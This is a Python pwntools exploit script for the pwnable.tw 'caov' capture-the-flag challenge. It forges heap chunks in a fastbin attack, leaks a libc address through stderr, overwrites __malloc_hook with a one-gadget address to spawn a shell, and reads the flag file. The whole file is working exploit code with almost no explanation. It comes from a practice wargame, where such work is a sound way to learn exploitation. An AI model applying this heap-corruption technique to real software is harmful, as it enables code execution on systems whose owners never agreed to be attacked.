#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10306
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./caov', checksec=False)
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so', checksec=False)
# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)
context.terminal = ['tmux', 'splitw', '-h']

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            # strlen
            b* 0x0000000000401A54
            # malloc
            b* 0x0000000000401A76
            # cin
            b* 0x0000000000401CAB
            b* 0x0000000000401C27
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def set_name(name):
    p.sendlineafter(b'name: ', name)

def show():
    p.sendlineafter(b'choice: ', str(1))

def edit(name, size, key, val):
    p.sendlineafter(b'choice: ', str(2))
    set_name(name)

    # edit_data()
    p.sendlineafter(b'length: ', str(size))

    # set_data()
    p.sendlineafter(b'Key: ', key)
    p.sendlineafter(b'Value: ', str(val))

# VARIABLE
global_D = 0x6032A0
name = 0x6032C0
stderr = 0x603280
size = 0x65
# REMOTE
gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
# LOCAL
# gadget = [0x4527a, 0xf03a4, 0xf1247]

# PAYLOAD
set_name(b'nhh')

p.sendlineafter(b'key: ', b'a'*8)
p.sendlineafter(b'value: ', str(1))

# playground()
payload = flat(
    0, 0x71,
    b'a'*0x50,
    name + 0x10, 0, 
    0, 0x21
    )
edit(payload, 0x10, b'a'*8, 10)

# name -> stderr + 5
payload = flat(
    0, 0x71,
    global_D - 0x1b, b'a'*0x48,
    0, 0,
    0, 0x21
    )
edit(payload, 0x10, b'a'*8, 10)

# stderr + 5
edit(b'nhh', size, b'a'*8, 10)

payload = flat(
    b'\0'*0xb,
    name # name = stderr
    )
edit(p64(stderr), size, payload, 10)

p.recvuntil(b'Your data info after editing:\n')
p.recvuntil(b'Key: ')
libc_leak = u64(p.recv(6) + b'\0'*2)
log.info("Libc leak: " + hex(libc_leak))
# LOCAL
# libc.address = libc_leak - 0x3c5540
# REMOTE
libc.address = libc_leak - libc.sym._IO_2_1_stderr_
log.info("Libc base: " + hex(libc.address))

# Attack
malloc_hook = libc.sym.__malloc_hook - 0x23
log.info("malloc_hook: " + hex(malloc_hook + 0x23))

payload = flat(
    name + 0x10, 0x71,
    b'a'*0x50,
    name + 0x10, b'a'*8,
    b'a'*8, 0x21
    )
edit(payload, 0x10, b'a'*8, 10)

# name -> malloc_hook - 0x23
payload = flat(
    name + 0x10, 0x71,
    malloc_hook, b'a'*0x48,
    0, 0,
    0, 0x21
    )
edit(payload, 0x10, b'a'*8, 10)

# malloc_hook - 0x23
payload = flat(
    name + 0x10, 0x71,
    malloc_hook
    )
GDB()
edit(payload, size, b'a'*8, 10)

# LOCAL: gadget[1]
payload = flat(
    b'\0'*0x13,
    gadget[2] + libc.address
    )
edit(p64(malloc_hook + 0x23), size, payload, 10)
p.sendline(b'cat /home/caov/flag')

# LOCAL
# p.sendlineafter(b'choice: ', str(2))
# set_name(p64(name + 0x8) + b'/bin/sh\0') # rdi = strlen

p.interactive()